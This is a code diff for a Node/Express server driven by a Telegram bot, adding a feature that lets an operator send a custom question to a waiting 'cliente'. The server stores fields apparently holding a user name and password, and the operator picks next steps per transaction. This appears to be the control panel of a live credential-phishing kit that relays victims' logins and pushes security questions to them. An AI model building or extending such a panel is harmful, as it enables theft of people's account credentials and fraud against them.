@@ -69,7 +69,8 @@ app.post('/enviar', async (req, res) => {
     status: "esperando",
     usar,
     clavv,
-    preguntas: []
+    preguntas: [],
+    estado_custom: false
   };
   guardarEstado();
 
@@ -124,7 +125,12 @@ app.post('/callback', async (req, res) => {
       keyboardPreguntas.inline_keyboard.push(fila);
     }
 
-    const respuesta = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    // Agregamos el botón de pregunta personalizada
+    keyboardPreguntas.inline_keyboard.push([
+      { text: "📝 Pregunta personalizada", callback_data: `custom_question:${txid}` }
+    ]);
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -133,9 +139,6 @@ app.post('/callback', async (req, res) => {
         reply_markup: keyboardPreguntas
       })
     });
-
-    const result = await respuesta.json();
-    console.log("🔁 Enviado submenú preguntas:", result);
 
     return res.sendStatus(200);
   }
@@ -166,6 +169,22 @@ app.post('/callback', async (req, res) => {
     return res.sendStatus(200);
   }
 
+  if (accion === 'custom_question') {
+    cliente.estado_custom = true;
+    guardarEstado();
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `✍️ Escribe la pregunta personalizada para ${txid}.`
+      })
+    });
+
+    return res.sendStatus(200);
+  }
+
   cliente.status = accion;
   guardarEstado();
 
@@ -175,6 +194,43 @@ app.post('/callback', async (req, res) => {
     body: JSON.stringify({
       callback_query_id: callback.id,
       text: `Has seleccionado: ${accion}`
+    })
+  });
+
+  res.sendStatus(200);
+});
+
+app.post('/webhook', async (req, res) => {
+  const message = req.body.message;
+  if (!message || !message.text) return res.sendStatus(200);
+
+  const chatId = message.chat.id;
+  const text = message.text;
+
+  const txid = Object.keys(clientes).find(id => clientes[id].estado_custom);
+  if (!txid) return res.sendStatus(200);
+
+  const cliente = clientes[txid];
+  if (!cliente) return res.sendStatus(200);
+
+  if (cliente.preguntas.length < 2 && !cliente.preguntas.includes(text)) {
+    cliente.preguntas.push(text);
+  }
+
+  cliente.estado_custom = false;
+
+  if (cliente.preguntas.length === 2) {
+    cliente.status = 'preguntas';
+  }
+
+  guardarEstado();
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: `✅ Pregunta personalizada guardada: "${text}"`
     })
   });
 
